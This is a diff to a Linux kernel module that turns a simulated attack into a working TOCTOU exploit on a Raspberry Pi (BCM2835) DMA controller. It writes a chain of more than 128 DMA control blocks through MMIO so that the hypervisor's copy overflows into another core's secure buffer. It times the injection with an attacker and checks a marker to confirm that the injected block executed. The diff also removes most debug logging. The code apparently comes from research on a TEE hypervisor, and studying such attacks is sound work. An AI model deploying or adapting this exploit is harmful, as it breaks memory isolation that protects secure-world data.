@@ -4,6 +4,8 @@
  * This module creates a DMA request with MORE than 128 control blocks,
  * causing buffer overflow into Core 1's secure buffer region.
  *
+ * REAL ATTACK: Actually triggers BCM2835 DMA controller via MMIO
+ * 
  * Attack mechanism:
  * - Each core has 4KB secure buffer = 128 CBs max (32 bytes each)
  * - Requesting 129+ CBs causes CB[128+] to overflow into Core 1's buffer
@@ -28,10 +30,6 @@ static int cb_count = OVERFLOW_CB_COUNT;
 module_param(cb_count, int, 0644);
 MODULE_PARM_DESC(cb_count, "Number of control blocks (>128 causes overflow)");
 
-static int debug = 1;
-module_param(debug, int, 0644);
-MODULE_PARM_DESC(debug, "Enable debug output");
-
 static int trigger = 0;
 module_param(trigger, int, 0644);
 MODULE_PARM_DESC(trigger, "Set to 1 to trigger the attack");
@@ -40,8 +38,22 @@ static int auto_start = 0;
 module_param(auto_start, int, 0644);
 MODULE_PARM_DESC(auto_start, "Auto-start victim thread on module load");
 
+static int dma_channel = ATTACK_DMA_CHANNEL;
+module_param(dma_channel, int, 0644);
+MODULE_PARM_DESC(dma_channel, "DMA channel to use (default: 5)");
+
+/* Timing parameters (microseconds) */
+static int timing_ready = DEFAULT_TIMING_READY_US;
+module_param(timing_ready, int, 0644);
+MODULE_PARM_DESC(timing_ready, "Delay after READY signal (us)");
+
+static int timing_inject = DEFAULT_TIMING_INJECT_US;
+module_param(timing_inject, int, 0644);
+MODULE_PARM_DESC(timing_inject, "Window for attacker injection (us)");
+
 /* Runtime state */
 static void __iomem *sync_flag_base;
+static void __iomem *dma_base;          /* DMA controller MMIO base */
 static struct task_struct *victim_thread;
 static volatile int stop_victim = 0;
 
@@ -50,9 +62,29 @@ static void *src_buf, *dst_buf;
 static dma_addr_t src_dma, dst_dma;
 static size_t buf_size;
 
+/* Verification buffer - to check if attack CB was executed */
+static void *verify_buf;
+static dma_addr_t verify_dma;
+
 /* CB chain */
 static struct bcm2835_dma_cb *cb_chain;
 static dma_addr_t cb_chain_dma;
+
+/* DMA channel register access */
+static inline void __iomem *dma_chan_base(int chan)
+{
+    return dma_base + (chan * BCM2835_DMA_CHAN_SIZE);
+}
+
+static inline void dma_write(int chan, u32 reg, u32 val)
+{
+    writel(val, dma_chan_base(chan) + reg);
+}
+
+static inline u32 dma_read(int chan, u32 reg)
+{
+    return readl(dma_chan_base(chan) + reg);
+}
 
 static inline void sync_write(u32 offset, u32 value)
 {
@@ -69,16 +101,6 @@ static inline u32 sync_read(u32 offset)
         return readl(sync_flag_base + offset);
     }
     return 0;
-}
-
-static void log_debug(const char *fmt, ...)
-{
-    va_list args;
-    if (debug) {
-        va_start(args, fmt);
-        vprintk(fmt, args);
-        va_end(args);
-    }
 }
 
 /*
@@ -99,13 +121,12 @@ static int create_cb_chain(void)
     }
     cb_chain_dma = virt_to_phys(cb_chain);
 
-    pr_info("[VICTIM] CB chain at phys=0x%08llx, %d blocks\n",
-            (unsigned long long)cb_chain_dma, cb_count);
-
     for (i = 0; i < cb_count; i++) {
         struct bcm2835_dma_cb *cb = &cb_chain[i];
 
-        cb->info = 0x00000001;
+        /* Transfer info: source increment, dest increment, wait for response */
+        cb->info = BCM2835_DMA_TI_S_INC | BCM2835_DMA_TI_D_INC | 
+                   BCM2835_DMA_TI_WAIT_RESP;
         cb->src = PHYS_TO_BUS(src_dma + (i * 32) % buf_size);
         cb->dst = PHYS_TO_BUS(dst_dma + (i * 32) % buf_size);
         cb->length = 32;
@@ -115,56 +136,124 @@ static int create_cb_chain(void)
             cb->next = PHYS_TO_BUS(cb_chain_dma + 
                                    (i + 1) * sizeof(struct bcm2835_dma_cb));
         } else {
-            cb->next = 0;
-        }
-
-        if (debug && (i < 3 || i >= cb_count - 3 || i == 127 || i == 128)) {
-            log_debug("[VICTIM] CB[%d]: next=0x%08x\n", i, cb->next);
+            cb->next = 0;  /* End of chain */
         }
     }
-
-    pr_info("[VICTIM] CB[127] ends at offset 0x%lx (last in Core 0 buffer)\n",
-            127 * sizeof(struct bcm2835_dma_cb));
-    pr_info("[VICTIM] CB[128] starts at offset 0x%lx (OVERFLOW!)\n",
-            128 * sizeof(struct bcm2835_dma_cb));
 
     return 0;
 }
 
 /*
- * Trigger DMA overflow attack
+ * Wait for DMA to complete or timeout
+ */
+static int wait_dma_complete(int timeout_us)
+{
+    u32 cs;
+    int elapsed = 0;
+
+    while (elapsed < timeout_us) {
+        cs = dma_read(dma_channel, BCM2835_DMA_CS);
+        
+        /* Check if DMA completed (not active and END flag set) */
+        if (!(cs & BCM2835_DMA_ACTIVE) && (cs & BCM2835_DMA_END)) {
+            return 0;  /* Success */
+        }
+        
+        /* Check for error */
+        if (cs & BCM2835_DMA_ERR) {
+            pr_err("[VICTIM] DMA error: CS=0x%08x\n", cs);
+            return -EIO;
+        }
+
+        udelay(1);
+        elapsed++;
+    }
+
+    return -ETIMEDOUT;
+}
+
+/*
+ * Trigger REAL DMA transfer - this causes EL2 trap via Stage 2 fault
  */
 static void trigger_dma_overflow(void)
 {
-    int my_core = smp_processor_id();
+    u32 result, cs;
+    u32 *verify_ptr;
+    int dma_result;
 
-    pr_info("[VICTIM] === TRIGGERING DMA OVERFLOW ===\n");
-    pr_info("[VICTIM] Core %d, CB count: %d, Overflow: %d CBs\n",
-            my_core, cb_count, cb_count - MAX_CBS_PER_CORE);
+    /* Reset result and verification buffer */
+    sync_write(SYNC_OFFSET_ATTACK_RESULT, ATTACK_RESULT_NONE);
+    verify_ptr = (u32 *)verify_buf;
+    *verify_ptr = 0;  /* Clear verification marker */
+    wmb();
 
-    /* Signal attacker */
+    /* Signal attacker: about to request DMA */
     sync_write(SYNC_OFFSET_VICTIM_CB_COUNT, cb_count);
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_READY);
     wmb();
 
-    udelay(100);
+    udelay(timing_ready);
 
+    /* 
+     * === REAL DMA TRIGGER ===
+     * Writing to CONBLK_AD register triggers Stage 2 fault
+     * which traps to EL2 (MyTEE hypervisor)
+     */
+    
+    /* Reset the DMA channel first */
+    dma_write(dma_channel, BCM2835_DMA_CS, BCM2835_DMA_RESET);
+    udelay(10);
+
+    /* Clear any previous status */
+    dma_write(dma_channel, BCM2835_DMA_CS, 
+              BCM2835_DMA_END | BCM2835_DMA_INT | BCM2835_DMA_ERR);
+
+    /* Signal: now triggering DMA (will trap to EL2) */
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_TRAPPED);
     wmb();
 
-    pr_info("[VICTIM] DMA request: CB chain at 0x%08llx\n",
-            (unsigned long long)PHYS_TO_BUS(cb_chain_dma));
+    /* 
+     * Write CB address to start DMA
+     * THIS IS THE CRITICAL WRITE - triggers Stage 2 fault -> EL2 trap
+     * EL2 will copy our CB chain to secure buffer (with overflow!)
+     */
+    dma_write(dma_channel, BCM2835_DMA_CONBLK_AD, PHYS_TO_BUS(cb_chain_dma));
+    wmb();
 
-    /* Wait for attacker */
-    mdelay(10);
+    /* Activate DMA - EL2 should have already processed our CB chain */
+    cs = BCM2835_DMA_ACTIVE | BCM2835_DMA_PRIORITY(8) | 
+         BCM2835_DMA_PANIC_PRIORITY(15);
+    dma_write(dma_channel, BCM2835_DMA_CS, cs);
+    wmb();
 
-    pr_info("[VICTIM] DMA executing... CB[128+] from Core 1 buffer!\n");
+    /* Wait for DMA completion */
+    dma_result = wait_dma_complete(10000);  /* 10ms timeout */
 
-    mdelay(10);
-    sync_write(SYNC_OFFSET_ATTACK_RESULT, 1);
+    /* Signal completion */
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACK_DONE);
 
-    pr_info("[VICTIM] === ATTACK SEQUENCE COMPLETE ===\n");
+    /* Check DMA result */
+    rmb();
+    result = sync_read(SYNC_OFFSET_ATTACK_RESULT);
+    cs = dma_read(dma_channel, BCM2835_DMA_CS);
+
+    /* Check verification buffer for attack pattern */
+    rmb();
+    if (*verify_ptr == VERIFY_PATTERN) {
+        result = ATTACK_RESULT_VERIFIED;
+        sync_write(SYNC_OFFSET_ATTACK_RESULT, result);
+    } else if (result == ATTACK_RESULT_INJECTED) {
+        result = ATTACK_RESULT_EXECUTED;
+        sync_write(SYNC_OFFSET_ATTACK_RESULT, result);
+    }
+
+    /* Log result */
+    pr_info("[VICTIM] DMA done: CBs=%d, CS=0x%08x, result=%s\n",
+            cb_count, cs,
+            result == ATTACK_RESULT_VERIFIED ? "VERIFIED" :
+            result == ATTACK_RESULT_EXECUTED ? "EXECUTED" :
+            result == ATTACK_RESULT_INJECTED ? "INJECTED" : 
+            dma_result ? "DMA_ERROR" : "NONE");
 }
 
 static int victim_thread_fn(void *data)
@@ -191,20 +280,19 @@ static int __init toctou_victim_init(void)
 {
     int ret;
 
-    pr_info("[VICTIM] Loading TOCTOU victim module\n");
-    pr_info("[VICTIM] CB count: %d (max per core: %d)\n", 
-            cb_count, MAX_CBS_PER_CORE);
-
-    if (cb_count > MAX_CBS_PER_CORE) {
-        pr_info("[VICTIM] OVERFLOW: %d CBs will go into Core 1's buffer\n",
-                cb_count - MAX_CBS_PER_CORE);
-    }
-
     /* Map sync memory */
     sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
     if (!sync_flag_base) {
         pr_err("[VICTIM] Failed to map sync memory\n");
         return -ENOMEM;
+    }
+
+    /* Map DMA controller registers */
+    dma_base = ioremap(BCM2835_DMA_BASE, 0x1000);
+    if (!dma_base) {
+        pr_err("[VICTIM] Failed to map DMA registers\n");
+        ret = -ENOMEM;
+        goto err_unmap_sync;
     }
 
     /* Allocate buffers */
@@ -221,10 +309,20 @@ static int __init toctou_victim_init(void)
     dst_dma = virt_to_phys(dst_buf);
     memset(src_buf, 0xAA, buf_size);
 
+    /* Allocate verification buffer */
+    verify_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, 
+                                           get_order(VERIFY_BUFFER_SIZE));
+    if (!verify_buf) {
+        ret = -ENOMEM;
+        goto err_free;
+    }
+    verify_dma = virt_to_phys(verify_buf);
+    memset(verify_buf, 0, VERIFY_BUFFER_SIZE);
+
     /* Create CB chain */
     ret = create_cb_chain();
     if (ret)
-        goto err_free;
+        goto err_free_verify;
 
     /* Start thread if auto_start */
     if (auto_start) {
@@ -236,18 +334,26 @@ static int __init toctou_victim_init(void)
         }
     }
 
-    pr_info("[VICTIM] Module loaded. Trigger: echo 1 > /sys/module/toctou_victim/parameters/trigger\n");
+    pr_info("[VICTIM] Loaded: cb=%d, overflow=%d, chan=%d, verify=0x%llx\n",
+            cb_count, cb_count - MAX_CBS_PER_CORE, dma_channel,
+            (unsigned long long)verify_dma);
     return 0;
 
 err_free_cb:
     if (cb_chain)
         free_pages((unsigned long)cb_chain, 
                    get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
+err_free_verify:
+    if (verify_buf)
+        free_pages((unsigned long)verify_buf, get_order(VERIFY_BUFFER_SIZE));
 err_free:
     if (src_buf)
         free_pages((unsigned long)src_buf, get_order(buf_size));
     if (dst_buf)
         free_pages((unsigned long)dst_buf, get_order(buf_size));
+    if (dma_base)
+        iounmap(dma_base);
+err_unmap_sync:
     if (sync_flag_base)
         iounmap(sync_flag_base);
     return ret;
@@ -255,8 +361,6 @@ err_free:
 
 static void __exit toctou_victim_exit(void)
 {
-    pr_info("[VICTIM] Unloading module\n");
-
     stop_victim = 1;
 
     if (victim_thread)
@@ -266,15 +370,20 @@ static void __exit toctou_victim_exit(void)
         free_pages((unsigned long)cb_chain,
                    get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
 
+    if (verify_buf)
+        free_pages((unsigned long)verify_buf, get_order(VERIFY_BUFFER_SIZE));
+
     if (src_buf)
         free_pages((unsigned long)src_buf, get_order(buf_size));
     if (dst_buf)
         free_pages((unsigned long)dst_buf, get_order(buf_size));
 
+    if (dma_base)
+        iounmap(dma_base);
     if (sync_flag_base)
         iounmap(sync_flag_base);
 
-    pr_info("[VICTIM] Module unloaded\n");
+    pr_info("[VICTIM] Unloaded\n");
 }
 
 module_init(toctou_victim_init);
